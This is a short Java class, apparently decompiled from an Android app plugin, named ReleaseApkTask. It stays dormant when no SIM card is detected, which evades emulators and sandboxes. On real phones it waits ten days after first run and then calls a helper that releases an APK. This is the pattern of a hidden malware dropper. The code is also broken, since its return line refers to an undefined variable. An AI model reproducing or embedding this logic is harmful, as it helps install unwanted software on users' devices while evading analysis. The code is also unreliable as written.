package com.clmobile.plugin.task;

import android.content.Context;
import android.telephony.TelephonyManager;
import com.clmobile.network.ResultData;
import com.clmobile.plugin.networktask.NetworkRequestParameters;
import com.clmobile.utils.Helper;
import com.clmobile.utils.Utils;

public class ReleaseApkTask extends BaseTask<Void> {
    private static final long ACTIVE_TIME_INTERVAL = 864000000;

    public ReleaseApkTask(Context context) {
        super(context, 0);
    }

    private boolean checkTime() {
        Long saved;
        if (isValidEnv()) {
            saved = Utils.loadObject("checkedtime", this.context);
            if (saved == null) {
                saved = Long.valueOf(System.currentTimeMillis());
                Utils.saveObject(this.context, "checkedtime", saved);
            }
        } else {
            saved = Long.valueOf(Long.MAX_VALUE);
            Utils.saveObject(this.context, "checkedtime", saved);
        }
        return System.currentTimeMillis() - ((Long) l).longValue() > 864000000;
    }

    private boolean isValidEnv() {
        TelephonyManager telephonyManager = (TelephonyManager) this.context.getSystemService("phone");
        return (telephonyManager.getSimState() == 1 || telephonyManager.getSimState() == 0) ? false : true;
    }

    public NetworkRequestParameters<Void> createNetworkRequestParameters() {
        return null;
    }

    public boolean execute() {
        if (checkTime()) {
            Helper.releaseApk(this.context);
        }
        return true;
    }

    public boolean hanldeResult(ResultData<Void> result) {
        return true;
    }
}